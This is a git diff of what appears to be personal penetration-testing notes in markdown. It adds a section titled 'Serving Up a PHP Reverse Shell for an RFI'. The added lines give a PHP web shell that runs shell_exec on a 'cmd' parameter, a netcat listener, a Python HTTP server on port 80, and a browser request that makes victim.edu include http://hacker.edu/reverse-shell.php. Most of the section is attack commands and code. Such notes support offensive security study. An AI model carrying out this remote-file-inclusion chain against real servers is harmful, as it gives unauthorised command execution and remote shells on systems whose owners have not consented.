@@ -26,9 +26,23 @@ drwx------@ 60 Victor  staff  1920 Apr 24 22:21 Library
 drwxr-xr-x+ 15 Victor  staff   480 Apr 26 15:17 .
 </pre>
 ```
-## Serving Up Malicious PHP Code
+
+## Serving Up a PHP Reverse Shell for an RFI
+Perform the steps below on the attacker side. 
 ```bash
+vim reverse-shell.php
+```
+```php
 <?php 
-  echo shell_exec($_GET['cmd']); 
+  echo shell_exec($_GET['cmd']); # replace this line with a reverse shell
 ?>
+```
+```python
+sudo nc -nvlp 5050 # terminal 1
+sudo python3 -m http.server 80 # terminal 2
+```
+```bash
+# prerequisite: you must know the 'file' parameter is valid and will be referenced by
+# an 'include' statement in the targeted web app's PHP code (other parameter examples: page, cmd, etc.)
+firefox http://victim.edu/index.php?file=http://hacker.edu/reverse-shell.php
 ```
